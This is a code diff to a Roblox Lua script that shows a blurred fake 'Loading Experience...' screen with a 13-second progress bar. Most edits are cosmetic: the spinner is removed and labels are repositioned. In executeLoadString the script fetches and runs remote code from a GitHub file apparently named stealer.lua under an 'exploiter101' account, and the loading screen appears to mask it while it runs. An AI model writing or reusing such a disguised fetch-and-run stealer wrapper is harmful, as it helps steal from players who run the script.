@@ -86,41 +86,11 @@ local function startPulse()
     }):Play()
 end
 
--- Create the loading spinner
-local spinner = Instance.new("Frame")
-spinner.Name = "Spinner"
-spinner.AnchorPoint = Vector2.new(0.5, 0.5)
-spinner.Position = UDim2.new(0.5, 0, 0.6, 0)
-spinner.Size = UDim2.new(0, 60, 0, 60)
-spinner.BackgroundTransparency = 1
-spinner.ZIndex = 99999
-
--- Create spinner segments
-local spinnerParts = {}
-for i = 1, 8 do
-    local part = Instance.new("Frame")
-    part.Name = "Part"..i
-    part.AnchorPoint = Vector2.new(0.5, 0.5)
-    part.Position = UDim2.new(0.5, 0, 0.5, 0)
-    part.Size = UDim2.new(0, 8, 0, 20)
-    part.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
-    part.BorderSizePixel = 0
-    part.Rotation = (i-1) * 45
-    part.ZIndex = 99999
-    
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0.5, 0)
-    corner.Parent = part
-    
-    spinnerParts[i] = part
-    part.Parent = spinner
-end
-
 -- Create loading text
 local loadingText = Instance.new("TextLabel")
 loadingText.Name = "LoadingText"
 loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
-loadingText.Position = UDim2.new(0.5, 0, 0.75, 0)
+loadingText.Position = UDim2.new(0.5, 0, 0.6, 0)  -- Adjusted position
 loadingText.Size = UDim2.new(0, 300, 0, 40)
 loadingText.BackgroundTransparency = 1
 loadingText.Text = "Loading Experience..."
@@ -133,7 +103,7 @@ loadingText.ZIndex = 99999
 local progressBar = Instance.new("Frame")
 progressBar.Name = "ProgressBar"
 progressBar.AnchorPoint = Vector2.new(0.5, 0.5)
-progressBar.Position = UDim2.new(0.5, 0, 0.8, 0)
+progressBar.Position = UDim2.new(0.5, 0, 0.7, 0)  -- Adjusted position
 progressBar.Size = UDim2.new(0.6, 0, 0, 8)
 progressBar.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
 progressBar.BorderSizePixel = 0
@@ -158,29 +128,9 @@ progressFillCorner.Parent = progressFill
 progressFill.Parent = progressBar
 logo.Parent = logoContainer
 logoContainer.Parent = blurContainer
-spinner.Parent = blurContainer
 loadingText.Parent = blurContainer
 progressBar.Parent = blurContainer
 blurContainer.Parent = blurScreen
-
--- Animation functions
-local function animateSpinner()
-    local time = 0
-    local connection
-    
-    connection = RunService.RenderStepped:Connect(function(delta)
-        time = time + delta
-        
-        for i, part in ipairs(spinnerParts) do
-            local alpha = (time * 2 - (i-1)/8) % 1
-            local scale = 0.3 + 0.7 * math.abs(math.sin(alpha * math.pi))
-            part.BackgroundTransparency = 0.2 + 0.8 * (1 - scale)
-            part.Size = UDim2.new(0, 8, 0, 20 * scale)
-        end
-    end)
-    
-    return connection
-end
 
 -- Smoother blur animation with longer duration
 local function animateBlur()
@@ -193,7 +143,7 @@ end
 
 -- Progress bar with 13 second duration
 local function simulateProgress()
-    local duration = 13  -- Increased from 4 to 13 seconds
+    local duration = 13
     local startTime = os.clock()
     
     while os.clock() - startTime < duration do
@@ -222,16 +172,23 @@ end
 local function executeLoadString()
     -- Replace this with your actual loadstring code
     local success, result = pcall(function()
-        -- Your loadstring code goes here
+        -- YOUR ACTUAL LOADSTRING CODE GOES HERE
         loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/growagarden/refs/heads/main/dark/stealer.lua"))()
         
-        -- Example code (replace with your actual implementation)
-        print("Executing loadstring...")
-        game:GetService("TestService"):Message("Loadstring executed successfully!")
+        -- Example notification
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Loadstring",
+            Text = "Script executed successfully!",
+            Duration = 5
+        })
     end)
     
     if not success then
-        warn("Error in loadstring: " .. tostring(result))
+        -- Show error message if loadstring fails
+        warn("Loadstring Error: " .. tostring(result))
+        loadingText.Text = "Error: Failed to load script"
+        loadingText.TextColor3 = Color3.fromRGB(255, 100, 100)
+        task.wait(3)  -- Show error for 3 seconds
     end
 end
 
@@ -241,8 +198,7 @@ local function showLoadingScreen()
     blurScreen.Parent = playerGui
     
     -- Start animations
-    local spinnerConnection = animateSpinner()
-    local blurTween = animateBlur()  -- Smoother blur animation
+    local blurTween = animateBlur()
     startPulse()
     
     -- Simulate loading progress with 13s duration
@@ -294,7 +250,6 @@ local function showLoadingScreen()
     blurFade.Completed:Wait()
     
     -- Clean up
-    spinnerConnection:Disconnect()
     if pulseTween then pulseTween:Cancel() end
     blurScreen:Destroy()
     blur:Destroy()
